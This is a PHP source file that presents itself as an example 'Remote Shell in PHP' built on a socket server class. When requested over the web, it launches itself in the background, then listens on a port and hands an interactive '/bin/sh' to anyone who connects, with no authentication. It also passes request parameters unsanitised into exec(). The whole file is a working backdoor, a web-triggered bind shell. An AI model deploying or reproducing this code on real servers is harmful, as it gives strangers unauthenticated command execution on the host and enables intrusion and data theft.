<?

if ( !( $_SERVER["USER"] OR $_SERVER["PWD"] OR $_SERVER["TERM"] OR count($_SERVER["argv"]) > 1 ) )
{
	// Corre por Web
	exec("php ".basename( $_SERVER["PHP_SELF"] )." ".$_REQUEST["ip"]." ".$_REQUEST["p"]."  & ");
	die(" RUN FORKED ");
}


/**
 * Remote Shell in PHP
 *
 * Thiss Class in a example of a Server create using class pserver
 *
 * @package pserver
 * @subpackage pserver.example
 * @author Pedro Vargas (deer@deerme.org) http://deerme.org
 * @version 0.1
 * @licence GNU General Public License (GPL)
 */

require('pserver.class.php'); 

 
class pshell extends pserver
{
	
	var $pipes = array(
			0 => array("pipe", "r"),
			1 => array("pipe", "w"),
			2 => array("pipe", "w")
			);

	var $shell = "/bin/sh -i";
	var $chunk_size = 4096;
	var $socketbinary = true;
	/**
	* Read data on the client
	*/
	
	function read( &$client  )
	{		
		$this->data[ $client['n'] ] = @socket_read($client['socket'], $this->bufferin, (  $this->socketbinary ?  PHP_BINARY_READ : PHP_NORMAL_READ  ) );
		// Have a shell ?
		if ( !isset( $client["shell"] ) )
		{			
			$client["shell"] = proc_open($this->shell, $this->pipes,$client["pipes"]);
			if (!is_resource($client["shell"]))
			{
				$this->_logger("Shell","Can't open shell ".$this->shell."  ");
			}
			else
			{
				$this->_logger("Shell","Open shell ".$this->shell."  ");
			}
			// Set everything to non-blocking
			stream_set_blocking($client["pipes"][0],0);
			stream_set_blocking($client["pipes"][1],0);
			stream_set_blocking($client["pipes"][2],0);			
		}		
		// Data Client -> Process
		fwrite($client["pipes"][0], $this->data[ $client['n'] ]);
		usleep(10000);			
		
	}
	
	/**
	* Write data on the client
	*/
	function write(  &$client , $data )
	{
		// If we can read from the process's STDOUT
		// send data down tcp connection		
		if ( !$client["shell"] )
			return false;
		if ( !isset( $client['pid'] ) AND  function_exists("pcntl_fork") )
		{
			$client['pid'] = pcntl_fork();
			if($pid == -1)
			{
				$this->logger("Process","Could not fork Process");
				die();
			}
			else if ($client['pid'])
			{	
				// Father
				$this->pids[] = $client['pid'];
			}
			else
			{
				// Son
				while( 1 == 1)
				{
					$input = fread($client["pipes"][1], $this->chunk_size);
					$input = str_replace("\n","\n\r",$input);
					if ( @socket_write($client['socket'], $input  ) === false )
					{					
						// Dead socket
						$this->logger("Socket","Dead Socket");
						socket_close($client['socket']);
						unset($client);
						// Die Process
						die();
					}
					
					$input = fread($client["pipes"][2], $this->chunk_size);
					$input = str_replace("\n","\n\r",$input);
					if ( $input != "" )
					{
						if ( eregi("sh" , $input ) and strlen($input) == 16 )
							$input = substr( $input , 0 , 8 );
						if ( @socket_write($client['socket'], $input  ) === false )
						{
						}
					}
					usleep(10000);
				}
			}
		}
		else
		{
			// I cant Fork
			$input = fread($client["pipes"][1], $this->chunk_size);
			$input = str_replace("\n","\n\r",$input);			
			if ( $input != "" )
			{
				if ( eregi("sh" , $input ) and strlen($input) == 16 )
					$input = substr( $input , 0 , 8 );
				if ( socket_write($client['socket'], $input  ) === false )
				{
					$this->logger("Socket","Dead Socket");
					socket_close($client['socket']);
					unset($client);
				}
			}
			$input = fread($client["pipes"][2], $this->chunk_size);
			$input = str_replace("\n","\n\r",$input);			
			if ( $input != "" )
			{
				if ( eregi("sh" , $input ) and strlen($input) == 16 )
					$input = substr( $input , 0 , 8 );
				if ( socket_write($client['socket'], $input  ) === false )
				{
					
				}
			}
		}		
		
	}
	
	
	
}

$ip = ($argv[1] ? $argv[1] : 0 );
$p = ($argv[2] ? $argv[2] : 30022 );

// Instance Server
$server = new pshell($ip,$p);
$server->welcome_data = unserialize(base64_decode("czozMzg6IhtbMTszMjs0MG1XZWxjb21lIHRvIFBIUCBQU2VydmVyG1sxOzM1OzQwbQ0KDQogICAgICAgICAgICAgICAgICAgICAgICAgIC98Xw0KICAgICAgICAgICAgICAgICAgICAgICAgLCcgIC5cDQogICAgICAgICAgICAgICAgICAgICwtLScgICAgXywnDQogICAgICAgICAgICAgICAgICAgLyAgICAgICAvDQogICAgICAgICAgICAgICAgICAoICAgLS4gIHwNCiAgICAgICAgICAgICAgICAgIHwgICAgICkgfA0KICAgICAgICAgICAgICAgICAoYC0uICAnLS0uKQ0KICAgICAgICAgICAgICAgICAgYC4gKS0tLS0nDQobWzE7MzI7NDBtCQkJIFBsZWFzZSwgdGFrZSBhIGNhdCAuLi4gG1sxOzM3OzQwbQoNIjs="));
$server->start();

?>